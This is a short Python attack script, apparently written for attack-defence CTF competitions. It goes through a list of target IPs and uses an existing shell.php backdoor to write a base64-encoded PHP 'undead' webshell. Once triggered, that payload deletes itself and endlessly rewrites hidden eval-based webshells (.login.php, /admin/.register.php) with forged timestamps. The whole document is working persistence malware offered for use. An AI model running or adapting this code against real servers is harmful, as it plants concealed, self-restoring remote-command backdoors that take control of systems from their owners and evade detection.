# -*- coding: utf-8 -*-
# @Author  : Y0n3er
# @Time    : 2023/10/20 19:59
# @blog    : https://y0n3er.github.io/
# @Software: PyCharm
# 该脚本用于拿到一个普通shell后马上植入不死马做个基本的权限维持,适合存在预留后门

import requests
from requests.exceptions import Timeout

with open('ip.txt', 'r', encoding='UTF-8') as f:
    for ip in f:
        ip = ip.strip()
        url = f'http://{ip}/upload/shell.php'

        #将需要写的不死马base64编码后放到下面
        cmd = {
            #直接生成在当前shell的目录，也可以自己做更改
            "cmd": 'system(" echo \'PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcubG9naW4ucGhwJzsKJGZpbGUxID0gJy9hZG1pbi8ucmVnaXN0ZXIucGhwJzsgCiRjb2RlID0gJzw/cGhwIGlmKG1kNSgkX1BPU1RbInBhc3N3ZCJdKT09IjA3ZDJlZTc2ODFiYWExYzg2NzFmNDc2MjhmZDBlNDM4Iil7QGV2YWwoJF9SRVFVRVNUWyJjbWQiXSk7fSA/Pic7Cgp3aGlsZSAoMSl7CiAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7CiAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDIwLTEyLTAxIDE4OjEwOjEyIiAubG9naW4ucGhwJyk7CiAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZTEsJGNvZGUpOwogICAgc3lzdGVtKCd0b3VjaCAtbSAtZCAiMjAyMC0xMi0wMSAxODoxMDoxMiIgL2FkbWluLy5yZWdpc3Rlci5waHAnKTsKICAgIHVzbGVlcCg1MDAwKTsKfQo/Pg==\'|base64 -d>121.php");'
        }
        proxy={'http':'http://127.0.0.1:8080'}
        post = requests.post(url=url, data=cmd,proxies=proxy)
        makekurl = f'http://{ip}/upload/121.php' #写入的不死马shell改名了这里需要改

        try:
            # 访问植入的不死马用来生成.login.php文件即真正的不死马
            make = requests.get(url=makekurl, timeout=2,proxies=proxy)
            print("生成失败")

        except Timeout:
            print("生成结束")

        checkurl = f'http://{ip}/upload/.login.php' #需要改
        check = requests.get(url=checkurl, timeout=2,proxies=proxy)
        if check.status_code == 200:
            print(f'[+] {ip} 写入成功')
        else:
            print(f'[-] {ip} 写入失败')
